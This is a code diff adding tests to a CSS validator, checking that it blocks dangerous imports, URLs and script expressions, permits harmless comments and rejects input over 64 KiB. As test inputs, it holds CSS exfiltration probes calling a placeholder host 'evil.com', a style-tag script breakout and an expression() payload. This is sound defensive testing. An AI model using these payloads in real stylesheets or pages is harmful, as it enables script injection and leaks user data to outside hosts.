@@ -50,4 +50,31 @@ describe('cssValidator', () => {
     expect(res.isValid).toBe(false);
     expect(res.error).toContain('Unclosed comment');
   });
+
+  it('blocks dangerous external imports, URLs, and script expressions', () => {
+    expect(validateCSS('@import url("https://evil.com/leak.css");').isValid).toBe(false);
+    expect(validateCSS('@/*comment*/import "malicious.css";').isValid).toBe(false);
+    expect(validateCSS('.card { background: url(https://evil.com/probe.png); }').isValid).toBe(false);
+    expect(validateCSS('.card { background: url("data:image/svg+xml,<svg></svg>"); }').isValid).toBe(false);
+    expect(validateCSS('</style><script>alert(1)</script>').isValid).toBe(false);
+    expect(validateCSS('.card { width: expression(alert(1)); }').isValid).toBe(false);
+    expect(validateCSS('@charset "UTF-8";').isValid).toBe(false);
+  });
+
+  it('allows safe comments mentioning forbidden keywords without false positives', () => {
+    const safeWithComment = `
+      /* @import is forbidden, use custom variables instead */
+      .glass-panel {
+        background: rgba(0, 0, 0, 0.5);
+      }
+    `;
+    expect(validateCSS(safeWithComment)).toEqual({ isValid: true });
+  });
+
+  it('rejects oversized CSS exceeding the 64 KiB boundary', () => {
+    const largeCSS = '.card { color: red; }\n'.repeat(3000); // > 64 KiB
+    const res = validateCSS(largeCSS);
+    expect(res.isValid).toBe(false);
+    expect(res.error).toContain('64 KiB size limit');
+  });
 });
